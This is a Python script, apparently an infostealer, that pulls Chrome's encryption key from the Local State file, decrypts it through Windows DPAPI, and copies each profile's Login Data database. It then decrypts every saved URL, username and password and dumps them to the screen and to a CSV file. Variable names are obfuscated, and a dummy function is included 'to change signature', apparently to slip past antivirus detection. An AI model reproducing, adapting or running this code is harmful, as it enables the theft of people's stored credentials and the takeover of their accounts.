import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import random
import string

# GLOBAL CONSTANT
QWERTYZXCVBNM123 = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
ASDFGHJKLPOIUYTRE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

# Random utility function
TYUIOPLKJHGFDSA12 = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
def JKLOIUYTREWQASDF():
    part1 = ''.join(random.choices(string.ascii_letters, k=8))
    part2 = ''.join(random.choices(string.digits, k=8))
    return part1 + part2

def ZXCVBNMASDFGHJKL():
    try:
        with open(QWERTYZXCVBNM123, "r", encoding='utf-8') as XCVBNMASDFGHJKLPO:
            POIUYTREWQASDFGH = XCVBNMASDFGHJKLPO.read()
            split1 = POIUYTREWQASDFGH[:len(POIUYTREWQASDFGH)//2]
            split2 = POIUYTREWQASDFGH[len(POIUYTREWQASDFGH)//2:]
            COMBINEDPOIUYTREWQ = json.loads(split1 + split2)
        SECRETENCRYPTKEY = base64.b64decode(COMBINEDPOIUYTREWQ["os_crypt"]["encrypted_key"])
        SECRETENCRYPTKEY = SECRETENCRYPTKEY[5:]
        DECRYPTEDSECRET = win32crypt.CryptUnprotectData(SECRETENCRYPTKEY, None, None, None, 0)[1]
        return DECRYPTEDSECRET
    except Exception as TYUIOPLKJHGFDSA:
        print(f"[ERROR] Unable to fetch secret key: {TYUIOPLKJHGFDSA}")
        return None

def ASZXCVBNMLKJHGFDS(cipher, payload):
    return cipher.decrypt(payload)

def QWERTYUIOPLKJHGFD(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def ZXCVBNMPOIUYTREW(ciphertext, secret_key):
    try:
        INITVECTORYTRESDFG = ciphertext[3:15]
        ENCRYPTEDPASSCVBNML = ciphertext[15:-16]
        CIPHERYTREWQASDFGH = QWERTYUIOPLKJHGFD(secret_key, INITVECTORYTRESDFG)
        DECRYPTEDPASSMNBVCX = ASZXCVBNMLKJHGFDS(CIPHERYTREWQASDFGH, ENCRYPTEDPASSCVBNML).decode()
        return DECRYPTEDPASSMNBVCX
    except Exception as ERRZXCVBNMLKJHGFD:
        print(f"[ERROR] Unable to decode password: {ERRZXCVBNMLKJHGFD}")
        return ""

def POIUYTREWQLKJHGF(db_path):
    try:
        TEMPDBXCVBNMASDFG = "TempLoginVault.db"
        shutil.copy2(db_path, TEMPDBXCVBNMASDFG)
        return sqlite3.connect(TEMPDBXCVBNMASDFG)
    except Exception as ERRMNBVCXZLKJHGF:
        print(f"[ERROR] Unable to connect to database: {ERRMNBVCXZLKJHGF}")
        return None

def YTREWQLKJHGFDSA():
    print("Random function to change signature.")
    return JKLOIUYTREWQASDF() * 2
    


if __name__ == '__main__':
    try:
        YTREWQLKJHGFDSA()

        with open('output_pw_dump.csv', mode='w', newline='', encoding='utf-8') as OUTFILEZXCVBNMASD:
            WRITERXCVBNMASD = csv.writer(OUTFILEZXCVBNMASD, delimiter=',')
            WRITERXCVBNMASD.writerow(["Idx", "URL", "User", "Pass"])

            SECRETKEYTYUIOPLKJHGF = ZXCVBNMASDFGHJKL()

            if not SECRETKEYTYUIOPLKJHGF:
                sys.exit("[ERROR] Missing secret key")

            PROFOLDERSLKJHGFD = [FOLDER for FOLDER in os.listdir(ASDFGHJKLPOIUYTRE) if re.search(r"^Profile.*|Default$", FOLDER)]

            for PROFILETYUIOPLKJH in PROFOLDERSLKJHGFD:
                DBPATHTYUIOPLKJHGFD = os.path.normpath(f"{ASDFGHJKLPOIUYTRE}\\{PROFILETYUIOPLKJH}\\Login Data")
                DBCONNECTIONLKJHGFDSA = POIUYTREWQLKJHGF(DBPATHTYUIOPLKJHGFD)

                if DBCONNECTIONLKJHGFDSA:
                    CURSORZXCVBNMLKJHGFD = DBCONNECTIONLKJHGFDSA.cursor()
                    CURSORZXCVBNMLKJHGFD.execute("SELECT action_url, username_value, password_value FROM logins")

                    for IDXPOIUYTREWQASDF, RECORDZXCVBNMLKJHGFD in enumerate(CURSORZXCVBNMLKJHGFD.fetchall()):
                        URLZXCVBNMLKJHGFDS, USERZXCVBNMLKJHGFDS, ENCRYPTEDPWZXCVBNMAS = RECORDZXCVBNMLKJHGFD

                        if URLZXCVBNMLKJHGFDS and USERZXCVBNMLKJHGFDS and ENCRYPTEDPWZXCVBNMAS:
                            DECRYPTEDPWZXCVBNMASD = ZXCVBNMPOIUYTREW(ENCRYPTEDPWZXCVBNMAS, SECRETKEYTYUIOPLKJHGF)
                            print(f"{IDXPOIUYTREWQASDF}: {URLZXCVBNMLKJHGFDS} | {USERZXCVBNMLKJHGFDS} | {DECRYPTEDPWZXCVBNMASD}")
                            WRITERXCVBNMASD.writerow([IDXPOIUYTREWQASDF, URLZXCVBNMLKJHGFDS, USERZXCVBNMLKJHGFDS, DECRYPTEDPWZXCVBNMASD])

                    CURSORZXCVBNMLKJHGFD.close()
                    DBCONNECTIONLKJHGFDSA.close()
                    os.remove("TempLoginVault.db")

    except Exception as MAINERRZXCVBNMLKJHGF:
        print(f"[ERROR] Unexpected error occurred: {MAINERRZXCVBNMLKJHGF}")
